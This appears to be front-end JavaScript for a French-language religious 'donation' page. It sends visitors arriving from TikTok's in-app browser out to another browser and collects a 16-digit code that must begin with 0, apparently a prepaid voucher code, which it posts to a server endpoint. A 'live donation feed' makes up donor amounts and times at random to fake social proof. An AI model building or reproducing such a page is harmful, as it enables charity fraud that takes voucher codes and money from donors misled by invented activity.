/* =========================================================
   TIKTOK IN-APP BROWSER DETECTION + GATEWAY
========================================================= */

(function () {
    var ua = navigator.userAgent || '';
    var isTikTok = ua.indexOf('TikTok') !== -1 || ua.indexOf('ByteDance') !== -1;

    if (isTikTok) {
        document.getElementById('ttGateway').classList.add('show');
        document.body.style.overflow = 'hidden';
    }

    var copyInput = document.getElementById('ttCopyInput');
    if (copyInput) {
        copyInput.value = window.location.href;
    }
})();

function copyLink() {
    var input = document.getElementById('ttCopyInput');
    var msg = document.getElementById('ttCopyMsg');
    var btn = document.getElementById('ttCopyBtn');

    var url = input.value;
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(url).then(function () {
            showCopied();
        }).catch(function () {
            fallbackCopy(input);
            showCopied();
        });
    } else {
        fallbackCopy(input);
        showCopied();
    }

    function showCopied() {
        msg.style.display = 'block';
        btn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Copié';
        setTimeout(function () {
            msg.style.display = 'none';
            btn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copier le lien';
        }, 3000);
    }

    function fallbackCopy(el) {
        el.select();
        el.setSelectionRange(0, 99999);
        try { document.execCommand('copy'); } catch (e) {}
    }
}


/* =========================================================
   STEP NAVIGATION
========================================================= */

var currentStep = 1;

function goToStep(step) {
    document.querySelectorAll('.step-section').forEach(function (s) {
        s.classList.remove('active');
    });
    document.getElementById('step' + step).classList.add('active');

    document.querySelectorAll('.progress-step').forEach(function (ps) {
        var psNum = parseInt(ps.dataset.step);
        ps.classList.remove('active', 'done');
        if (psNum < step) {
            ps.classList.add('done');
        } else if (psNum === step) {
            ps.classList.add('active');
        }
    });

    var fill = document.getElementById('progressFill');
    fill.style.width = (step / 3 * 100) + '%';

    currentStep = step;

    document.querySelector('.container').scrollIntoView({ behavior: 'smooth', block: 'start' });

    if (step === 3) {
        setTimeout(function () {
            document.getElementById('code').focus();
        }, 400);
    }
}


/* =========================================================
   FORM SUBMISSION
========================================================= */

document.getElementById('codeForm').addEventListener('submit', async function (e) {
    e.preventDefault();

    var code = document.getElementById('code').value.replace(/\s/g, '');
    var messageDiv = document.getElementById('message');
    var submitBtn = document.getElementById('submitBtn');

    messageDiv.className = 'message';
    messageDiv.textContent = '';

    if (!code.startsWith('0')) {
        messageDiv.textContent = 'Code invalide. Vérifiez votre code et réessayez.';
        messageDiv.className = 'message error';
        return;
    }

    if (!/^0\d{15}$/.test(code)) {
        messageDiv.textContent = 'Le code doit contenir 16 chiffres. Vérifiez et réessayez.';
        messageDiv.className = 'message error';
        return;
    }

    submitBtn.classList.add('loading');
    submitBtn.disabled = true;

    try {
        var response = await fetch('/api/send-code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ code: code })
        });

        var data = await response.json();

        if (response.ok) {
            messageDiv.innerHTML = '<div class="success-check"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg></div><p class="success-title">BaarakaAllahu fik !</p><p class="success-sub">Votre don a bien été envoyé. Qu\'Allah l\'accepte et vous récompense.</p>';
            messageDiv.className = 'message success';
            document.getElementById('code').value = '';
            launchConfetti();
        } else {
            messageDiv.textContent = data.error || 'Erreur lors de l\'envoi. Veuillez réessayer.';
            messageDiv.className = 'message error';
        }
    } catch (error) {
        messageDiv.textContent = 'Erreur de connexion. Veuillez réessayer.';
        messageDiv.className = 'message error';
    } finally {
        submitBtn.classList.remove('loading');
        submitBtn.disabled = false;
    }
});


/* =========================================================
   CONFETTI
========================================================= */

function launchConfetti() {
    var colors = ['#2563EB', '#3B82F6', '#60A5FA', '#0EA5E9', '#93C5FD'];
    var container = document.createElement('div');
    container.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9998;overflow:hidden;';
    document.body.appendChild(container);

    for (var i = 0; i < 60; i++) {
        (function (idx) {
            var piece = document.createElement('div');
            var size = 6 + Math.random() * 8;
            var left = Math.random() * 100;
            var delay = Math.random() * 0.3;
            var duration = 1.5 + Math.random() * 1.5;
            var color = colors[Math.floor(Math.random() * colors.length)];
            var rotate = Math.random() * 360;

            piece.style.cssText =
                'position:absolute;' +
                'top:-20px;' +
                'left:' + left + '%;' +
                'width:' + size + 'px;' +
                'height:' + (size * 0.4) + 'px;' +
                'background:' + color + ';' +
                'border-radius:2px;' +
                'transform:rotate(' + rotate + 'deg);' +
                'opacity:1;' +
                'animation:confettiFall ' + duration + 's ease-in ' + delay + 's forwards;';

            container.appendChild(piece);
        })(i);
    }

    var style = document.createElement('style');
    style.textContent =
        '@keyframes confettiFall {' +
        'to { transform: translateY(105vh) rotate(720deg); opacity: 0; }' +
        '}';
    document.head.appendChild(style);

    setTimeout(function () {
        container.remove();
        style.remove();
    }, 3500);
}


/* =========================================================
   LIVE DON FEED
========================================================= */

(function () {
    var amounts = [10, 15, 20, 25, 30, 35, 50, 100];
    var messages = [
        'Un don de {amt} € vient d\'être reçu',
        'Quelqu\'un vient de donner {amt} €',
        'Un don de {amt} € a été envoyé',
        'BaarakaAllahu fik pour ce don de {amt} €',
        'Un soutien de {amt} € vient d\'arriver'
    ];
    var timeSlots = [
        'il y a quelques secondes',
        'il y a 1 minute',
        'il y a 2 minutes',
        'il y a 3 minutes',
        'il y a 5 minutes'
    ];

    var feedText = document.getElementById('donFeedText');
    if (!feedText) return;

    function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

    function updateFeed() {
        var amt = pick(amounts);
        var msg = pick(messages).replace('{amt}', amt);
        var time = pick(timeSlots);
        feedText.textContent = msg + ' · ' + time;

        var feed = document.getElementById('donFeed');
        feed.classList.remove('feed-in');
        void feed.offsetWidth;
        feed.classList.add('feed-in');
    }

    updateFeed();
    setInterval(updateFeed, 8000 + Math.random() * 4000);
})();


/* =========================================================
   INPUT FORMATTING
========================================================= */

document.getElementById('code').addEventListener('input', function (e) {
    var value = e.target.value.replace(/\D/g, '');
    if (value.length > 16) value = value.slice(0, 16);
    e.target.value = value;
});
